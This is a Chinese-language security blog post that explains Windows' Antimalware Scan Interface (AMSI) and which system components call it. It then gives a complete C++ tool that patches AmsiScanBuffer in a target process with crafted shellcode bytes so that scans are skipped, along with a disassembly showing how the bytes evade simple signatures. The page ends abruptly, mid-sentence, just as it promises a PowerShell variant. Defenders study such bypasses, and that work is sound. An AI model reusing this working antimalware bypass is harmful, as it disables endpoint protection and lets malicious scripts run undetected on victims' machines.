

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="keyixiaxiang">
  <meta name="keywords" content="">
  
    <meta name="description" content="首先什么是AMSI：  是一组 反恶意软件扫描接口 Windows API，允许任何应用程序与防病毒产品集成（假设该产品充当 AMSI 提供程序）。 与许多第三方 AV 解决方案一样，Windows Defender 自然地充当 AMSI 提供程序。AMSI 充当应用程序和 AV 引擎之间的桥梁，以 PowerShell 为例——当用户试图执行任何代码时，PowerShell 会在执行之前将其提交">
<meta property="og:type" content="article">
<meta property="og:title" content="浅谈AMSI和ETW">
<meta property="og:url" content="https://kyxiaxiang.github.io/2022/12/14/AMSIandEtw/index.html">
<meta property="og:site_name" content="可以遐想的Blog">
<meta property="og:description" content="首先什么是AMSI：  是一组 反恶意软件扫描接口 Windows API，允许任何应用程序与防病毒产品集成（假设该产品充当 AMSI 提供程序）。 与许多第三方 AV 解决方案一样，Windows Defender 自然地充当 AMSI 提供程序。AMSI 充当应用程序和 AV 引擎之间的桥梁，以 PowerShell 为例——当用户试图执行任何代码时，PowerShell 会在执行之前将其提交">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://learn.microsoft.com/en-us/windows/win32/amsi/images/amsi7archi.jpg">
<meta property="og:image" content="https://kyxiaxiang.github.io/img/001.png">
<meta property="og:image" content="https://kyxiaxiang.github.io/img/002.png">
<meta property="og:image" content="https://kyxiaxiang.github.io/img/003.png">
<meta property="og:image" content="https://kyxiaxiang.github.io/img/004.png">
<meta property="article:published_time" content="2022-12-14T17:25:18.000Z">
<meta property="article:modified_time" content="2024-11-02T12:45:55.252Z">
<meta property="article:author" content="keyixiaxiang">
<meta property="article:tag" content="bypass">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://learn.microsoft.com/en-us/windows/win32/amsi/images/amsi7archi.jpg">
  
  
  
  <title>浅谈AMSI和ETW - 可以遐想的Blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"kyxiaxiang.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 7.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>遐想的自留地</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="浅谈AMSI和ETW"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2022-12-14 12:25" pubdate>
          2022年12月14日 中午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          2.2k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          19 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">浅谈AMSI和ETW</h1>
            
            
              <div class="markdown-body">
                
                <p>首先什么是AMSI：</p>
<p> 是一组 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal">反恶意软件扫描接口 </a>Windows API，允许任何应用程序与防病毒产品集成（假设该产品充当 AMSI 提供程序）。 与许多第三方 AV 解决方案一样，Windows Defender 自然地充当 AMSI 提供程序。AMSI 充当应用程序和 AV 引擎之间的桥梁，以 PowerShell 为例——当用户试图执行任何代码时，PowerShell 会在执行之前将其提交给 AMSI。 如果 AV 引擎认为内容是恶意的，AMSI 将报告回来，PowerShell 将不会运行代码。 对于在内存中运行且从不接触磁盘的基于脚本的恶意软件，这是一个很好的解决方案。任何应用程序开发人员都可以使用 AMSI 来扫描用户提供的输入。</p>
<p> 使用基于脚本的恶意软件，它很容易被混淆。 但是，AMSI 允许开发人员扫描最终缓冲区，因为代码最终必须去混淆。</p>
<p> Amsi.dll</p>
<p> 对于向 AMSI 提交样本的应用程序，它必须 将 amsi.dll 加载到其地址空间并调用从该 DLL 导出的一系列 AMSI API。我们使用ApiMonitor Hook到Powershell并观察他调用了哪些Api。</p>
<p>主要是：</p>
<table>
<thead>
<tr>
<th>功能</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/desktop/api/amsi/nf-amsi-amsiclosesession"><strong>AmsiCloseSession</strong></a></td>
<td>关闭由 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/desktop/api/amsi/nf-amsi-amsiopensession">AmsiOpenSession </a>打开的会话。</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/desktop/api/amsi/nf-amsi-amsiinitialize"><strong>AmsiInitialize</strong></a></td>
<td>初始化 AMSI API。</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-amsinotifyoperation"><strong>AmsiNotifyOperation</strong></a></td>
<td>向反恶意软件提供商发送任意操作的通知。</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/desktop/api/amsi/nf-amsi-amsiopensession"><strong>AmsiOpenSession</strong></a></td>
<td>打开一个会话，在该会话中可以关联多个扫描请求。</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/desktop/api/amsi/nf-amsi-amsiresultismalware"><strong>AmsiResultIsMalware</strong></a></td>
<td>确定扫描结果是否指示应阻止内容。</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/desktop/api/amsi/nf-amsi-amsiscanbuffer"><strong>AmsiScanBuffer</strong></a></td>
<td>扫描充满内容的缓冲区以查找恶意软件。</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/desktop/api/amsi/nf-amsi-amsiscanstring"><strong>AmsiScanString</strong></a></td>
<td>扫描字符串中的恶意软件。</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/desktop/api/amsi/nf-amsi-amsiuninitialize"><strong>AmsiUninitialize</strong></a></td>
<td>删除最初由 AmsiInitialize 打开的 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/desktop/api/amsi/nf-amsi-amsiinitialize">AMSI </a>API 实例。</td>
</tr>
</tbody></table>
<p>这是微软给出的AMSI体系结构</p>
<p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/amsi/images/amsi7archi.jpg"><img src="https://learn.microsoft.com/en-us/windows/win32/amsi/images/amsi7archi.jpg" srcset="/img/loading.gif" lazyload alt="img"></a></p>
<p>Windows AMSI 接口是开放的。 这意味着任何应用程序都可以调用它； 任何注册的反恶意软件引擎都可以处理提交给它的内容。但是国内的很多AV都没有使用它，我不是很理解。</p>
<blockquote>
<p><strong>反恶意软件扫描所有assemblies</strong> 。 在以前版本的 .NET Framework 中，运行时使用 Windows Defender 或第三方反恶意软件扫描从磁盘加载的所有程序集。 但是，不会扫描从其他来源（例如通过 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/dotnet/api/system.reflection.assembly.load#system-reflection-assembly-load(system-byte())">Assembly.Load() </a>方法加载的程序集，并且可能包含未检测到的恶意软件。 从在 Windows 10 上运行的 .NET Framework 4.8 开始，运行时通过实现反 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/desktop/AMSI/antimalware-scan-interface-portal">恶意软件扫描接口 (AMSI) </a>的反恶意软件解决方案触发扫描。</p>
</blockquote>
<p>从 .NET 4.8 开始，AMSI 成为框架的一部分。 因此，当加载程序集时，AMSI.DLL 也会加载。 这将 .NET 回溯到 4.0 以提供对 AMSI 的支持。</p>
<p>AMSI在windows系统中被直接或间接的调用，主要分布在以下程序:</p>
<p>1.<code>用户账户控制</code>，UAC（用户账户控制），安装EXE、COM、MSI或者ActiveX时提升权限</p>
<figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs haml"><span class="hljs-tag">%<span class="hljs-selector-tag">windir</span></span>%\System32\consent.exe <br><br>PHP<br></code></pre></td></tr></table></figure>

<p>2.<code>Powershell</code>（脚本、交互式使用以及动态代码执行）</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">System<span class="hljs-selector-class">.Management</span><span class="hljs-selector-class">.Automation</span><span class="hljs-selector-class">.dll</span> <br><br>PHP<br></code></pre></td></tr></table></figure>

<p>3.<code>Windows脚本</code></p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">wscript.<span class="hljs-keyword">exe</span>或者cscript.<span class="hljs-keyword">exe</span><br><br>PHP<br></code></pre></td></tr></table></figure>

<p>4.<code>JavaScript、VBScript</code></p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mel">%windir%\System32\jscript.dll %windir%\System32\vbscript.dll <br><br>PHP<br></code></pre></td></tr></table></figure>

<p>5.<code>Office VBA macros</code></p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">VBE7<span class="hljs-selector-class">.dll</span> <br><br>PHP<br></code></pre></td></tr></table></figure>

<p>6.<code>.NET Assembly</code></p>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-keyword">clr</span>.dll <br><br>PHP<br></code></pre></td></tr></table></figure>

<p>7.<code>WMI</code></p>
<figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs haml"><span class="hljs-tag">%<span class="hljs-selector-tag">windir</span></span>%\System32\wbem\fastprox.dll<br><br>PHP<br></code></pre></td></tr></table></figure>

<p>powershell本质就是<strong>System.Management.Automation.dll</strong>，这个我之前在浅谈powershell中有说过。我们在本机开启一个powershell查看加载的模块就会发现他自动加载了amsi.dll。[<img src="https://kyxiaxiang.github.io/img/001.png" srcset="/img/loading.gif" lazyload alt="001"></p>
<p>目前最常见的绕过方法就是修补 AMSI的 <code>AmsiScanBuffer</code>。</p>
<figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs wren"><span class="hljs-comment">#include &lt;Windows.h&gt;</span><br><span class="hljs-comment">#include &lt;stdio.h&gt;</span><br><span class="hljs-comment">#pragma comment(lib, &quot;ntdll&quot;)</span><br><br><span class="hljs-comment">#ifndef NT_SUCCESS</span><br><span class="hljs-comment">#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) &gt;= 0)</span><br><span class="hljs-comment">#endif</span><br><br><br><span class="hljs-variable">EXTERN_C</span> <span class="hljs-variable">NTSTATUS</span> <span class="hljs-title class_">NtProtectVirtualMemory</span>(<br>    <span class="hljs-variable">IN</span> <span class="hljs-variable">HANDLE</span> <span class="hljs-title class_">ProcessHandle</span>,<br>    <span class="hljs-variable">IN</span> <span class="hljs-variable">OUT</span> <span class="hljs-variable">PVOID</span><span class="hljs-operator">*</span> <span class="hljs-title class_">BaseAddress</span>,<br>    <span class="hljs-variable">IN</span> <span class="hljs-variable">OUT</span> <span class="hljs-variable">PSIZE_T</span> <span class="hljs-title class_">RegionSize</span>,<br>    <span class="hljs-variable">IN</span> <span class="hljs-variable">ULONG</span> <span class="hljs-title class_">NewProtect</span>,<br>    <span class="hljs-variable">OUT</span> <span class="hljs-variable">PULONG</span> <span class="hljs-title class_">OldProtect</span>);<br><br><span class="hljs-variable">EXTERN_C</span> <span class="hljs-variable">NTSTATUS</span> <span class="hljs-title class_">NtWriteVirtualMemory</span>(<br>    <span class="hljs-variable">IN</span> <span class="hljs-variable">HANDLE</span> <span class="hljs-title class_">ProcessHandle</span>,<br>    <span class="hljs-variable">IN</span> <span class="hljs-variable">PVOID</span> <span class="hljs-title class_">BaseAddress</span>,<br>    <span class="hljs-variable">IN</span> <span class="hljs-variable">PVOID</span> <span class="hljs-title class_">Buffer</span>,<br>    <span class="hljs-variable">IN</span> <span class="hljs-variable">SIZE_T</span> <span class="hljs-title class_">NumberOfBytesToWrite</span>,<br>    <span class="hljs-variable">OUT</span> <span class="hljs-variable">PSIZE_T</span> <span class="hljs-title class_">NumberOfBytesWritten</span> <span class="hljs-variable">OPTIONAL</span>);<br><br><br><br><span class="hljs-variable">void</span> <span class="hljs-title function_">patchAMSI</span>(<span class="hljs-params">HANDLE</span>&amp; <span class="hljs-params">hProc</span>) &#123;<br>    <span class="hljs-variable">void</span><span class="hljs-operator">*</span> <span class="hljs-title class_">AMSIaddr</span> <span class="hljs-operator">=</span> <span class="hljs-title class_">GetProcAddress</span>(<span class="hljs-title class_">LoadLibrary</span>A(<span class="hljs-string">&quot;amsi.dll&quot;</span>), <span class="hljs-string">&quot;AmsiScanBuffer&quot;</span>);<br>    <span class="hljs-variable">char</span> <span class="hljs-variable">amsiPatch</span>[<span class="hljs-number">100</span>];<br>    <span class="hljs-title function_">lstrcatA</span>(<span class="hljs-variable">amsiPatch</span>, <span class="hljs-string">&quot;<span class="hljs-char escape_">\x31</span><span class="hljs-char escape_">\xC0</span><span class="hljs-char escape_">\x05</span><span class="hljs-char escape_">\x4E</span><span class="hljs-char escape_">\xFE</span><span class="hljs-char escape_">\xFD</span><span class="hljs-char escape_">\x7D</span><span class="hljs-char escape_">\x05</span><span class="hljs-char escape_">\x09</span><span class="hljs-char escape_">\x02</span><span class="hljs-char escape_">\x09</span><span class="hljs-char escape_">\x02</span><span class="hljs-char escape_">\xC3</span>&quot;</span>);<br>    <span class="hljs-variable">DWORD</span> <span class="hljs-title class_">OldProtect</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-variable">SIZE_T</span> <span class="hljs-variable">memPage</span> <span class="hljs-operator">=</span> <span class="hljs-number">0x1000</span>;<br>    <span class="hljs-variable">void</span><span class="hljs-operator">*</span> <span class="hljs-variable">ptrAMSIaddr</span> <span class="hljs-operator">=</span> <span class="hljs-title class_">AMSIaddr</span>;<br><br><br><br>    <span class="hljs-variable">NTSTATUS</span> <span class="hljs-title class_">NtProtectStatus</span>1 <span class="hljs-operator">=</span> <span class="hljs-title class_">NtProtectVirtualMemory</span>(<span class="hljs-variable">hProc</span>, (<span class="hljs-variable">PVOID</span><span class="hljs-operator">*</span>)<span class="hljs-operator">&amp;</span><span class="hljs-variable">ptrAMSIaddr</span>, (<span class="hljs-variable">PSIZE_T</span>)<span class="hljs-operator">&amp;</span><span class="hljs-variable">memPage</span>, <span class="hljs-number">0x04</span>, <span class="hljs-operator">&amp;</span><span class="hljs-title class_">OldProtect</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-operator">!</span><span class="hljs-title function_">NT_SUCCESS</span>(<span class="hljs-title class_">NtProtectStatus</span>1)) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-variable">NTSTATUS</span> <span class="hljs-title class_">NtWriteStatus</span> <span class="hljs-operator">=</span> <span class="hljs-title class_">NtWriteVirtualMemory</span>(<span class="hljs-variable">hProc</span>, (<span class="hljs-variable">LPVOID</span>)<span class="hljs-title class_">AMSIaddr</span>, (<span class="hljs-variable">PVOID</span>)<span class="hljs-variable">amsiPatch</span>, <span class="hljs-title function_">sizeof</span>(<span class="hljs-variable">amsiPatch</span>), (<span class="hljs-variable">SIZE_T</span><span class="hljs-operator">*</span>)<span class="hljs-variable">nullptr</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-operator">!</span><span class="hljs-title function_">NT_SUCCESS</span>(<span class="hljs-title class_">NtWriteStatus</span>)) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-variable">NTSTATUS</span> <span class="hljs-title class_">NtProtectStatus</span>2 <span class="hljs-operator">=</span> <span class="hljs-title class_">NtProtectVirtualMemory</span>(<span class="hljs-variable">hProc</span>, (<span class="hljs-variable">PVOID</span><span class="hljs-operator">*</span>)<span class="hljs-operator">&amp;</span><span class="hljs-variable">ptrAMSIaddr</span>, (<span class="hljs-variable">PSIZE_T</span>)<span class="hljs-operator">&amp;</span><span class="hljs-variable">memPage</span>, <span class="hljs-title class_">OldProtect</span>, <span class="hljs-operator">&amp;</span><span class="hljs-title class_">OldProtect</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-operator">!</span><span class="hljs-title function_">NT_SUCCESS</span>(<span class="hljs-title class_">NtProtectStatus</span>2)) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-title function_">printf</span>(<span class="hljs-string">&quot;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\n</span>[+] AmsiScanBuffer is Patched!<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\n</span>&quot;</span>);<br>&#125;<br><br><br>int <span class="hljs-title function_">main</span>(<span class="hljs-params">int</span> <span class="hljs-params">argc</span>, <span class="hljs-params">char</span>** <span class="hljs-params">argv</span>) &#123;<br><br>    <span class="hljs-variable">HANDLE</span> <span class="hljs-variable">hProc</span>;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">argc</span> <span class="hljs-operator">&lt;</span> <span class="hljs-number">2</span>) &#123;<br>        <span class="hljs-title function_">printf</span>(<span class="hljs-string">&quot;USAGE: AMSIbypass.exe &lt;PID&gt;<span class="hljs-char escape_">\n</span>&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-variable">hProc</span> <span class="hljs-operator">=</span> <span class="hljs-title class_">OpenProcess</span>(<span class="hljs-variable">PROCESS_VM_OPERATION</span> <span class="hljs-operator">|</span> <span class="hljs-variable">PROCESS_VM_WRITE</span>, <span class="hljs-variable">FALSE</span>, (<span class="hljs-variable">DWORD</span>)<span class="hljs-title function_">atoi</span>(<span class="hljs-variable">argv</span>[<span class="hljs-number">1</span>]));<br>    <span class="hljs-keyword">if</span> (<span class="hljs-operator">!</span><span class="hljs-variable">hProc</span>) &#123;<br>        <span class="hljs-title function_">printf</span>(<span class="hljs-string">&quot;OpenProcess Error (%u)<span class="hljs-char escape_">\n</span>&quot;</span>, <span class="hljs-title class_">GetLastError</span>());<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;<br>    &#125;<br><br>    <span class="hljs-title function_">patchAMSI</span>(<span class="hljs-variable">hProc</span>);<br><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br><br><span class="hljs-variable">WREN</span><br></code></pre></td></tr></table></figure>

<p>这里我用C++实现了一个简单的修补AMSI。首先我们看一下这么写的含义是什么，首先掏出ida看一看amsi.dll，查看导出表定位到AmsiScanBuffer</p>
<p><img src="https://kyxiaxiang.github.io/img/002.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>可以非常清楚地感受到，AmsiScanBuffer 判断rcx中的参数是不是有效的， 如果发现无效参数，它会分支到 <strong>loc_18000c787</strong> 。 在这里，它将 <strong>0x80070057</strong> 移动到 <strong>eax</strong> 中，绕过执行实际扫描的分支并返回。 这样就可以达到阻断执行恶意脚本的目的。</p>
<p>0x80070057是什么呢，他是微软定义好的HRESULT 值 。他代表E_INVALIDARG。它也可以是别的值</p>
<table>
<thead>
<tr>
<th>HRESULT 值</th>
<th>hex</th>
</tr>
</thead>
<tbody><tr>
<td>E_OUTOFMEMORY</td>
<td>0x8007000E</td>
</tr>
<tr>
<td>E_ACCESSDENIED</td>
<td>0x80070005</td>
</tr>
<tr>
<td>E_HANDLE</td>
<td>0x80070006</td>
</tr>
</tbody></table>
<p>我们在C++代码中通过GetProcAddress(LoadLibraryA(“amsi.dll”), “AmsiScanBuffer”)，获取到AmsiScanBuffer的地址。然后我们覆盖AmsiScanBuffer的开头来完成patch</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0</span>:  <span class="hljs-number">31</span> c0                   xor    eax,eax<br><span class="hljs-attribute">2</span>:  <span class="hljs-number">05</span> <span class="hljs-number">4</span>e fe fd <span class="hljs-number">7</span>d          add    eax,<span class="hljs-number">0</span>x7dfdfe4e<br><span class="hljs-attribute">7</span>:  <span class="hljs-number">05</span> <span class="hljs-number">09</span> <span class="hljs-number">02</span> <span class="hljs-number">09</span> <span class="hljs-number">02</span>          add    eax,<span class="hljs-number">0</span>x2090209<br><span class="hljs-attribute">c</span>:  c3                      ret <br><br><span class="hljs-attribute">APACHE</span><br></code></pre></td></tr></table></figure>

<p>使他返回一个<strong>AMSI_RESULT_CLEAN</strong>的结果。</p>
<figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs elm">typedef enum <span class="hljs-type">AMSI_RESULT</span> &#123;<br>    <span class="hljs-type">AMSI_RESULT_CLEAN</span>,<br>    <span class="hljs-type">AMSI_RESULT_NOT_DETECTED</span>,<br>    <span class="hljs-type">AMSI_RESULT_BLOCKED_BY_ADMIN_START</span>,<br>    <span class="hljs-type">AMSI_RESULT_BLOCKED_BY_ADMIN_END</span>,<br>    <span class="hljs-type">AMSI_RESULT_DETECTED</span><br>&#125;;<br><br><span class="hljs-type">ELM</span><br></code></pre></td></tr></table></figure>

<p> 使用这种汇编写法，做了一些计算来达到同样的的效果 7dfdfe4e+2090209 &#x3D; 8007 0057，会比mov eax,0x80070057 然后ret要好一些。</p>
<p> 但是这种修补绕过的方法并不好，如果EDR这种东西进行了内存区域执行完整性检查。EDR会检测到它啥时候被更改了。我们还可以使用断点来绕过Amsi。<a target="_blank" rel="noopener" href="https://www.pentestpartners.com/security-blog/patchless-amsi-bypass-using-sharpblock/">嫖自这里</a> 这种方法AMSIDetection 是没有检测到任何篡改的。但是这个我还木有看明白,所以就不写了。</p>
<p>如果想给Powershell脚本自带上AMSIpatch,可以加上这一段</p>
